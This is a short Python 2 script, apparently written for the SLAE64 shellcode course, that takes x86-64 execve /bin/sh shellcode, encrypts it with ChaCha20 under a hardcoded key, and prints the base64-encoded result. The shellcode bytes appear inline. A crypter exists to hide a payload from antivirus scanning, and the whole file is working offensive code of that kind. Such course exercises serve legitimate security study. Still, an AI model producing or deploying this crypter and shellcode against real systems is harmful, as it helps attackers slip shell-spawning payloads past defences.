#!/usr/bin/python
# Python Chacha20 Crypter
# Author: ID: SLAE64 - 1525
#
# Usage: python Encrypt.py

from Crypto.Cipher import ChaCha20
import base64


def encrypt():
    shellcode = "\x48\x31\xc0\x50\x5a\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05" # Execve-stack shellcode
    secret = b'G-KaPdSgVkYp3s6v9y$B&E)H@MbQeThW'
    cipher = ChaCha20.new(key=secret)
    crypted_shellcode = cipher.nonce + cipher.encrypt(shellcode)
    return base64.b64encode(crypted_shellcode)


if __name__ == "__main__":
    print encrypt()
